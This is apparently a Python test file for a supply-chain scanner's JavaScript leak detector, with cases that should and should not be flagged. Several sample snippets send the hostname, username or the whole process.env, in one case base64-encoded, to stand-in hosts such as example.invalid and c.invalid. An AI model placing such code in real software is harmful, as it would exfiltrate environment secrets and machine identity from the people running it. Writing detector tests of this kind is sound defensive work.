"""`JavaScriptLeak`: the machine's identity or the whole environment in what a request sends."""

from __future__ import annotations

from cordon_scanner.detect.secretflow import JavaScriptLeak

SENDS_IDENTITY_AND_ENV = """
const https = require("https");
const os = require("os");
const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: process.env,
});
const req = https.request({ hostname: "example.invalid", method: "POST" });
req.write(data);
req.end();
"""


class TestJavaScriptLeak:
    def test_identity_and_environment_bound_then_written_to_a_request(self) -> None:
        kinds = {kind for _, kind in JavaScriptLeak.findings(SENDS_IDENTITY_AND_ENV)}
        assert kinds == {"identity", "environment"}

    def test_straight_into_a_request_call(self) -> None:
        text = "fetch('https://example.invalid/c', { method: 'POST', body: os.hostname() });"
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]

    def test_one_named_variable_is_not_the_whole_environment(self) -> None:
        text = "fetch(url, { headers: { Authorization: process.env.API_TOKEN } });"
        assert JavaScriptLeak.findings(text) == []

    def test_a_file_stream_is_not_a_request(self) -> None:
        text = (
            "const fs = require('fs'); const os = require('os');\n"
            "const log = fs.createWriteStream('app.log');\n"
            "log.write(os.hostname());\nfetch('https://example.invalid/health');\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_identity_used_locally_is_not_sent(self) -> None:
        text = "const host = os.hostname();\nconsole.log(host);\nfetch('https://example.invalid/ping');\n"
        assert JavaScriptLeak.findings(text) == []

    def test_a_request_through_a_module_chosen_at_run_time(self) -> None:
        text = (
            "const data = JSON.stringify({ env: process.env });\n"
            "const mod = url.protocol === 'https:' ? https : http;\n"
            "const req = mod.request(opts, () => {});\nreq.write(data);\n"
        )
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["environment"]


class TestWhatIsNotSent:
    """Each shape was a false block in a random sample of 15,000 published packages."""

    def test_a_callback_body_is_not_what_a_request_sends(self) -> None:
        text = (
            "const os = require('os');\nconst who = os.hostname();\n"
            "https.get(url, (res) => { log(who); res.resume(); });\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_a_child_processs_environment_is_not_a_request(self) -> None:
        text = (
            "const env = Object.assign({}, process.env, { CI: '1' });\n"
            "const res = spawnSync('bash', args, { env, stdio: 'inherit' });\n"
            "fetch(url, { method: 'POST', body: JSON.stringify(res.status) });\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_one_named_variable_does_not_borrow_the_name_env(self) -> None:
        text = (
            "const env = { ...process.env };\nconst base = process.env.REGISTRY_URL || 'https://r.invalid';\n"
            "https.get(base + '/latest');\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_a_word_in_a_string_is_not_a_variable(self) -> None:
        text = (
            "const debug = process.env;\nconst name = cfg.func ?? 'debug';\n"
            "fetch(`https://r.invalid/${encodeURIComponent(name)}`);\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_checking_the_environment_exists_is_not_sending_it(self) -> None:
        text = (
            "const debug = typeof process === 'object' && process.env && process.env.NODE_DEBUG;\n"
            "fetch(url, { body: String(debug) });\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_a_path_under_home_is_not_the_users_identity(self) -> None:
        text = (
            "const configPath = path.join(os.homedir(), '.tool', 'config');\n"
            "const content = fs.readFileSync(configPath, 'utf-8');\n"
            "fetch(api, { method: 'POST', body: JSON.stringify({ email }) });\n"
        )
        assert JavaScriptLeak.findings(text) == []

    def test_the_environment_serialised_into_a_request_is_still_found(self) -> None:
        text = (
            "const payload = Buffer.from(JSON.stringify(process.env)).toString('base64');\n"
            "fetch('https://c.invalid/x', { method: 'POST', body: payload });\n"
        )
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["environment"]

    def test_the_hostname_in_a_template_url_is_still_found(self) -> None:
        text = "https.get(`https://c.invalid/p?h=${os.hostname()}`);\n"
        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]
